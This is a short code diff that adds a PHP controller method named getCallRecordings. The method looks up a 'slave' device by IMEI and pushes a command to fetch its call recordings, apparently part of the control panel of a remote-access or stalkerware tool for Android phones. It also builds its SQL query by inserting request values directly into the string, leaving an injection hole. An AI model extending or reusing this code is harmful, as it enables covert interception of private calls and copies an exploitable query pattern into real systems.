@@ -282,6 +282,27 @@ echo "error";
 
 }
 }
+public function getCallRecordings($device,$message)
+{
+$username=$this->session->userdata('username');
+
+$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
+$res=$query->result();
+$slaveid=$res[0]->slaveid;
+$type="getcallrecordings";
+$message="getcallrecordings";
+$number="getcallrecordings";
+$state=$this->pushExtras($slaveid,$type,$number,$message);
+if($state)
+{
+echo "success";
+}
+else
+{
+echo "error";
+
+}
+}
 
 public function alarm($device,$message)
 {
